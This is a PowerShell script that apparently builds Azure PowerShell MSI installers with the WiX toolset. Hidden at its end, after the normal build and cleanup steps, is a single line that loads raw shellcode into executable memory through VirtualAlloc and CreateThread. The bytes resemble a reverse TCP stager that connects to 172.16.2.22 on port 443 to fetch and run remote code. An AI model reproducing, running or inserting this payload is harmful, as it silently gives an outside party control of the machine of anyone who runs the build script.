

param(
    [Parameter(HelpMessage="The version number for the generated MSI.  This will be obtained from the Az module if not specified.")]
    [string]$version="0",
    
    [Parameter(HelpMessage="Prevent a build number from being tacked on the end of the version number.")]
    [Switch]$noBuildNumber,

    [Parameter(HelpMessage="Set the repository to pull packages from.")]
    [string]$repository="PSGallery"
    )

if( (-not (get-command -ea 0 light)) -or (-not (get-command -ea 0 heat)) -or (-not(get-command -ea 0  candle)) ) {
    write-host -fore Red  "This script requires WiX Toolset in the path. [exiting]"
    return ;
}




$outputName ="Az-Cmdlets"


$productName = "Microsoft Azure PowerShell - $((Get-Culture).DateTimeFormat.GetMonthName((get-date).month)) $((get-date).year)"


$tmp = Join-Path $env:temp azure-cmdlets-tmp


$modulesDir = "$tmp\modules"


$archs = @('x86','x64')

$scriptLocation = (Get-Item $PSCommandPath).Directory


Write-Host -fore yellow "Forcing clean install"
$shhh = (cmd.exe /c rmdir /s /q $tmp)

$shhh = mkdir -ea 0 "$tmp"
erase -ea 0 "$tmp/*.wixobj"
erase -ea 0 "$tmp/*.wxi"

erase -ea 0 "$scriptLocation/*.wixpdb"
erase -ea 0 "$scriptLocation/*.msi"


if ( -not (test-path $modulesDir))  {
    Write-Host -fore green "Installing Modules..."
    
    $shh= mkdir -ea 0 $modulesDir 

    
    save-module az -path $modulesDir -Repository $repository

    if ($version -eq "0")
    {
        $version = (Get-ChildItem -Path $modulesDir\Az).Name
    }

    Write-Host -fore green "Tweaking Modules"
    cmd /c dir /a/s/b "$modulesDir\psgetmoduleinfo.xml" |% {
        Write-Host -fore Gray " - Patching $_"
        (gc $_ -raw ) -replace ".*<S N=.InstalledLocation.*S>",""  | Set-Content $_
        (gc $_ -raw ) -replace ".*<S N=.RepositorySourceLocation`".*S>",'<S N="RepositorySourceLocation">https://www.powershellgallery.com/api/v2/</S>'  | Set-Content $_
        (gc $_ -raw ) -replace ".*<S N=.Repository`".*S>",'<S N="Repository">PSGallery</S>'  | Set-Content $_
    }
}


if( -not $noBuildNumber ) {
    
    $buildNumber = git rev-list --parents HEAD --count --full-history

    
    if ($buildNumber -ne $null)
    {
        $version = "$version.$buildNumber"
    }
}


$archs |% {
    $arch = $_
    $includeFile = "$tmp\azurecmdfiles-$arch.wxi"
    erase -ea 0 $includeFile
    Write-Host -fore green "Generating '$includeFile' include file"
    heat dir $modulesDir -out $includeFile -srd -sfrag -sreg -ag -g1 -cg "azurecmdfiles$arch" -dr "Modules$arch" -var var.modulesDir -indent 2 -nologo 
    if( $LASTEXITCODE) {
        write-host -fore red "Failed to generate include file."
        break;
    }

    Write-Host -fore gray " - Fixing include file."
    (gc $includeFile).replace('<Wix', '<Include') | Set-Content $includeFile
    (gc $includeFile).replace('</Wix' ,'</Include') | Set-Content $includeFile
    (gc $includeFile).replace('PSGetModuleInfo.xml" />' ,'PSGetModuleInfo.xml" Hidden="yes" />') | Set-Content $includeFile
}
if( $LASTEXITCODE) {
    
    return;
}

$archs |% {
    $arch = $_
    Write-Host -fore green "Compiling Wix Script for $arch"  
    $out = candle -arch $arch -ext WixUIExtension "-dversion=$version" -sw1118 -nologo "-I$tmp" "-dtmp=$tmp" "-dmodulesDir=$modulesDir" "-dproductName=$productName" $scriptLocation\azurecmd.wxs -out "$tmp\$outputName-$version-$arch.wixobj"
    if( $LASTEXITCODE) {
        write-host -fore red "Failed to compile WiX Script for $arch"
        write-host -fore red $out        
        break;
    }

    Write-Host -fore green "Creating installer for $arch"
    $out = light "$tmp\$outputName-$version-$arch.wixobj" -ext WixUIExtension -out "$scriptLocation\$outputName-$version-$arch.msi" -sw1076 -sice:ICE80  -nologo -b $scriptLocation
    if( $LASTEXITCODE) {
        write-host -fore red "ERROR: Failed to link MSI for $arch" 
        write-host -fore red $out
        break;
    }

    write-host -fore cyan "Installer Created: $scriptLocation\$outputName-$version-$arch.msi"
}
if( $LASTEXITCODE) {
    
    return;
}

erase -ea 0 "$tmp/*.wixpdb"
erase -ea 0 "$tmp/*.wixobj"

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xac,0x10,0x02,0x16,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

